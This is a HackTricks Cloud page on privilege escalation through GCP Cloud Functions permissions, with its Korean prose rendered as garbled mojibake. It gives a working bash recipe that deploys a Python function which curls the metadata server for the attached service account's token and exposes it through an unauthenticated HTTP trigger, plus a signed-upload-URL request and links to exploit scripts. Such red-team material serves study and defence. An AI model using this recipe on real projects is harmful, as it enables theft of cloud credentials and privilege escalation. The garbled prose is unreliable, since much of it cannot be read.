# GCP - Cloudfunctions Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## cloudfunctions

Cloud Functionsì— ëŒ€í•œ ì¶”ê°€ ì •ë³´:

{% content-ref url="../gcp-services/gcp-cloud-functions-enum.md" %}
[gcp-cloud-functions-enum.md](../gcp-services/gcp-cloud-functions-enum.md)
{% endcontent-ref %}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ì„ì˜ì˜ (ì•…ì˜ì ì¸) ì½”ë“œë¥¼ ê°€ì§„ ìƒˆë¡œìš´ Cloud Functionì„ ìƒì„±í•˜ê³  ì´ë¥¼ Service Accountì— í• ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ê·¸ëŸ° ë‹¤ìŒ ë©”íƒ€ë°ì´í„°ì—ì„œ Service Account í† í°ì„ ìœ ì¶œí•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•¨ìˆ˜ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ ì¼ë¶€ ê¶Œí•œì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ë°©ë²•ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ ìŠ¤í¬ë¦½íŠ¸ëŠ” [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py)ì™€ [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ë¯¸ë¦¬ ë¹Œë“œëœ .zip íŒŒì¼ì€ [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **Functionì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ê³  ì‹¬ì§€ì–´ ì—°ê²°ëœ ì„œë¹„ìŠ¤ ê³„ì •ì„ ìˆ˜ì •í•˜ì—¬ í† í°ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

{% hint style="danger" %}
Cloud functionsë¥¼ ë°°í¬í•˜ë ¤ë©´ ê¸°ë³¸ ì»´í“¨íŠ¸ ì„œë¹„ìŠ¤ ê³„ì • ë˜ëŠ” ì´ë¯¸ì§€ë¥¼ ë¹Œë“œí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì„œë¹„ìŠ¤ ê³„ì •ì— ëŒ€í•œ actAs ê¶Œí•œë„ í•„ìš”í•©ë‹ˆë‹¤.
{% endhint %}

ë²„ì „ 1 cloudfunctionsì— ëŒ€í•œ `.call` ê¶Œí•œì´ë‚˜ í•¨ìˆ˜ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ `role/run.invoker` ì—­í• ê³¼ ê°™ì€ ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
{% hint style="danger" %}
`Permission 'run.services.setIamPolicy' denied on resource...` ì˜¤ë¥˜ê°€ ë°œìƒí•˜ëŠ” ê²½ìš°, `--allow-unauthenticated` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ê³  ìˆìœ¼ë©° ì´ì— ëŒ€í•œ ì¶©ë¶„í•œ ê¶Œí•œì´ ì—†ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
{% endhint %}

ì´ ë°©ë²•ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ ìŠ¤í¬ë¦½íŠ¸ëŠ” [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `cloudfunctions.functions.sourceCodeSet`

ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ **í•¨ìˆ˜ ë²„í‚·ì— íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆëŠ” ì„œëª…ëœ URLì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(í•˜ì§€ë§Œ í•¨ìˆ˜ì˜ ì½”ë“œëŠ” ë³€ê²½ë˜ì§€ ì•Šìœ¼ë©°, ì—¬ì „íˆ ì—…ë°ì´íŠ¸í•´ì•¼ í•©ë‹ˆë‹¤)**

{% code overflow="wrap" %}
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
{% endcode %}

ê³µê²©ìì˜ ê´€ì ì—ì„œ ì´ ê¶Œí•œë§Œìœ¼ë¡œ ì–¼ë§ˆë‚˜ ìœ ìš©í• ì§€ëŠ” ì˜ ëª¨ë¥´ê² ì§€ë§Œ, ì•Œì•„ë‘ë©´ ì¢‹ìŠµë‹ˆë‹¤.

### `cloudfunctions.functions.setIamPolicy`, `iam.serviceAccounts.actAs`

ì´ì „ì˜ **`.update`** ë˜ëŠ” **`.create`** ê¶Œí•œ ì¤‘ í•˜ë‚˜ë¥¼ ë¶€ì—¬í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `cloudfunctions.functions.update`

**`cloudfunctions`** ê¶Œí•œë§Œ ê°€ì§€ê³  **`iam.serviceAccounts.actAs`** ê¶Œí•œì´ ì—†ìœ¼ë©´ í•¨ìˆ˜ë¥¼ ì—…ë°ì´íŠ¸í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ì´ê²ƒì€ ìœ íš¨í•œ ê¶Œí•œ ìƒìŠ¹ì´ ì•„ë‹™ë‹ˆë‹¤.

### ë²„í‚·ì— ëŒ€í•œ ì½ê¸° ë° ì“°ê¸° ì ‘ê·¼

ë²„í‚·ì— ëŒ€í•œ ì½ê¸° ë° ì“°ê¸° ì ‘ê·¼ ê¶Œí•œì´ ìˆë‹¤ë©´ ì½”ë“œì˜ ë³€í™”ë¥¼ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìœ¼ë©°, ë²„í‚·ì—ì„œ **ì—…ë°ì´íŠ¸ê°€ ë°œìƒí•  ë•Œë§ˆë‹¤ ìƒˆë¡œìš´ ì½”ë“œë¥¼ ìì‹ ì˜ ì½”ë“œë¡œ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ê·¸ëŸ¬ë©´ ìƒˆë¡œìš´ ë²„ì „ì˜ Cloud Functionì´ ì œì¶œëœ ë°±ë„ì–´ ì½”ë“œë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤.

ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

ê·¸ëŸ¬ë‚˜, ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì œ3ìì˜ Cloud Functionsë¥¼ ì‚¬ì „ ì¹¨í•´í•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ ìì‹ ì˜ ê³„ì •ì— ë²„í‚·ì„ ìƒì„±í•˜ê³  ì™¸ë¶€ í”„ë¡œì íŠ¸ê°€ ì“¸ ìˆ˜ ìˆë„ë¡ ê³µê°œ ê¶Œí•œì„ ë¶€ì—¬í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

{% hint style="danger" %}
ê·¸ëŸ¬ë‚˜, ì´ëŠ” DoS ê³µê²©ì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ì•„í‹°íŒ©íŠ¸ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ëŒ€í•œ ì½ê¸° ë° ì“°ê¸° ì ‘ê·¼

Cloud Functionì´ ìƒì„±ë  ë•Œ ìƒˆë¡œìš´ ë„ì»¤ ì´ë¯¸ì§€ê°€ í”„ë¡œì íŠ¸ì˜ ì•„í‹°íŒ©íŠ¸ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— í‘¸ì‹œë©ë‹ˆë‹¤. ìƒˆë¡œìš´ ì´ë¯¸ì§€ë¡œ ì´ë¯¸ì§€ë¥¼ ìˆ˜ì •í•˜ë ¤ê³  ì‹œë„í–ˆì§€ë§Œ, í˜„ì¬ ì´ë¯¸ì§€ë¥¼ ì‚­ì œí•˜ê³  `cache` ì´ë¯¸ì§€ë¥¼ ì‚­ì œí•´ë„ ì•„ë¬´ ë³€í™”ê°€ ì—†ì—ˆê³ , Cloud Functionì€ ê³„ì† ì‘ë™í–ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ì•„ë§ˆë„ **ë²„í‚·ê³¼ ê°™ì€ ê²½ìŸ ì¡°ê±´ ê³µê²©ì„ ì•…ìš©í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤.** ê·¸ëŸ¬ë‚˜ **ì €ì¥ëœ ì´ë¯¸ì§€ë¥¼ ìˆ˜ì •í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œëŠ” Cloud Functionì„ ì¹¨í•´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.**

## References

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜, **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
